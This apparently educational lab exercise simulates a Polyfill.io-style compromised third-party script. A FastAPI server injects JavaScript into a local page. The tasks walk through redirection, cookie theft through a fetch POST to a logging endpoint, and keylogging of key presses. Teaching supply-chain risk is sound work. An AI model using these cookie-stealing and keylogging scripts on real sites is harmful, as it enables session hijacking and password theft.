---
title: Practice
---

This exercise puts you in a scenario similar to the real example found in `Polyfill.io`, where attackers exploited a widely used package to inject malicious code into applications. Here, you will focus on simulating the potential impact and explore different types of attacks. This practice highlights the risks and consequences of relying on third-party scripts.

## Environment Setup

For this exercise, we will use Python to create a server for our API. The server will simulate the behavior of a compromised third-party script by serving JavaScript code to a vulnerable application. Before we start, we will create a virtual environment to isolate the dependencies we need for this exercise.

**Virtual Environment:** A Python virtual environment is a self-contained directory that isolates different Python dependencies, allowing you to manage different versions of libraries for each project without conflicts.

```bash
# Create a virtual environment
python -m venv .venv

# Then activate the virtual environment

# On Windows
.venv\Scripts\activate

# On Unix or MacOS
source .venv/bin/activate
```

**Install Requirements:** This exercise uses external libraries and frameworks for the server and API. The main dependency we will need is FastAPI, a modern Python framework for creating APIs. FastAPI will be used to create a server that simulates the behavior of a compromised third-party script.

```bash
# Install FastAPI
python -m pip install "fastapi[standard]"
```

### The Vulnerable Program

The vulnerable program used in this exercise is called `index.html`. This program links an external script from the server `http://localhost:8000`, and you will explore how to send malicious code to exploit the application.

```html
<!-- Save this as index.html -->

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Demonstrates the risks of relying on third-party scripts -->
    <script src="http://localhost:8000"></script>
    <title>Document</title>
</head>
<body>
    <h1>Hello World!</h1>
</body>
</html>
```

### The Exploit Program

The exploit program used in this exercise is called `server.py`. This program sets up a server using FastAPI, which will serve JavaScript code to the vulnerable application. By simulating a malicious third-party script, this program demonstrates how attackers can exploit external dependencies.

```python
# Save this as server.py

from fastapi import FastAPI, Request, Response
from fastapi.middleware.cors import CORSMiddleware

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Allow all origins; for stricter rules, specify origins
    allow_methods=["*"],  # Allow all HTTP methods
    allow_headers=["*"],  # Allow all headers
)


# Serves JavaScript to the vulnerable program
@app.get("/")
async def root():
    # Prepare the JavaScript code
    javascript_code = """\
    """
    return Response(content=javascript_code, media_type="application/javascript")
```

### Common Commands

In the following, we list some common commands for this exercise.

```bash
# Start the server for the API
fastapi dev /path/to/server.py

# To stop the server press CTRL+C to quit
```

## Task 1: Redirect the Client

In this task, we will simulate how an attacker might use malicious code to manipulate the vulnerable program. Your goal is to modify the variable `javascript_code` to redirect users to another website when the script is loaded. To do this, you can use the `window.location` object in JavaScript.

```javascript
window.location.href = 'https://www.example.com';
```

When you update `javascript_code`, start the exploit program and open the vulnerable program in a browser to observe how the malicious script affects the application. If it works, the client will see a different website.

```python
# Example JavaScript code
javascript_code = """\
function example() {
    console.log("Hello Exploit!");
}

// Call the function
example()
"""
```

## Task 2: Steal the Client's Cookies

In this task, we will simulate how an attacker might steal cookies from the vulnerable program. Cookies often store sensitive information which attackers can use to impersonate users or to gain unauthorized access. To simulate this attack, first update the vulnerable program to include cookies.

```html
<head>
    ...
    <!-- Simulates cookies with fake credentials -->
    <script>
        document.cookie = "sessionID=abc123fakeSessionID; path=/";
        document.cookie = "userToken=xyz789demoToken; path=/";
    </script>
    ...
</head>
```

Next, update the exploit program by adding a new endpoint that receives and logs the client's cookies. After making these changes, restart the server.

```python
# Endpoint to receive the client's cookies
@app.post("/post-cookies")
async def log_cookies(request: Request):
    client = request.client
    body = await request.json()
    print(f"{client=} {body=}")
    return {"message": "Cookie data received"}
```

With these changes, your goal is to modify the variable `javascript_code` to include malicious code that can steal the cookies from the client. To do this, you will need to include code to send a POST request to the server.

```javascript
async function example() {
    const cookies = ...; // Retrieve the cookies
    const data = ...; // Include the cookies
    try {
        const response = await fetch("http://localhost:8000/post-cookies", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify(data), // Send the data
        });
        console.log(`Server response: ${response.status}`);
    } catch (error) {
        console.error(`Error sending cookies: ${error}`);
    }
}
```

When you update `javascript_code`, start the exploit program and open the vulnerable program in a browser to observe how the malicious script affects the application. If it works, the server will log the client's cookies.

## Task 3: Log the Client's Key Presses

In this task, we will simulate how an attacker might capture key presses from the vulnerable program. This is known as keylogging and is often used to record sensitive information entered by users, like passwords. To simulate this attack, first update the exploit program by adding a new endpoint.

```python
# Endpoint to receive the client's key presses
@app.post("/post-keys")
async def log_keys(request: Request):
    client = request.client
    body = await request.json()
    print(f"{client=} {body=}")
    return {"message": "Key data received"}
```

With these changes, your goal is to modify the variable `javascript_code` to include malicious code that can listen for and send key presses made by the client. To do this, you will need to listen for key presses to then send.

```javascript
document.addEventListener("keydown", async (event) => {
    // Prepare the key press data
    const keyPressed = { key: event.key };
    
    // Send the key press data to the server
    ...
});
```

When you update `javascript_code`, start the exploit program and open the vulnerable program in a browser to observe how the malicious script affects the application. If it works, the server will log the client's key presses.
